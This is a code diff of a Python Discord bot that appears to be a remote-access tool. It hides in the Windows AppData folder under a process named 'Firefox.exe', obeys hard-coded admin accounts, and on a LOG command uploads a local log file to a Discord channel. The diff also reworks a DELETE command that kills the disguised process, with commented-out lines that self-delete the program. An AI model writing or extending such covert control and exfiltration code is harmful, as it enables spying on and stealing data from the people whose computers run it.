@@ -6,8 +6,8 @@ import sys
 
 
 client = discord.Client()
-# airsoft = os.path.join(os.environ['appdata'], 'Airsoft')
-airsoft = os.path.join('/home/nurbek/Python/airsoft/', 'Windows', 'Airsoft')
+airsoft = os.path.join(os.environ['appdata'], 'Airsoft')
+# airsoft = os.path.join('/home/nurbek/Python/airsoft/', 'Windows', 'Airsoft')
 admins = (837582713783451668, 459623637948039189)
 
 
@@ -42,20 +42,17 @@ def rename_config(name=False) -> None:
         file.close()
 
 
-def kill_process(name: str):
+def find_process(name):
     for process in psutil.process_iter():
         if process.name() == name:
-            process.kill()
             return True
     return False
 
-
-def uninstall():
-    if not kill_process('Firefox.exe'):
-        return 'Failed deleting Firefox.exe'
-    os.rmdir(airsoft)
-    os.remove(sys.argv[0])
-    return 'Success!'
+def kill_process(name: str):
+    while find_process(name):
+        for process in psutil.process_iter():
+            if process.name() == name:
+                process.kill()
 
 
 @client.event
@@ -100,7 +97,12 @@ async def on_message(message):
                 elif command == 'LOG':
                     await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))
                 elif command == 'DELETE':
-                    await message.channel.send(uninstall())
+                    kill_process('Firefox.exe')
+                    # for file in os.listdir(airsoft):
+                    #     os.remove(os.path.join(airsoft, file))
+                    # os.rmdir(airsoft)
+                    # os.remove(sys.argv[0])
+                    # await message.channel.send('Success!')
 
     except Exception as Error:
         await message.channel.send(Error)
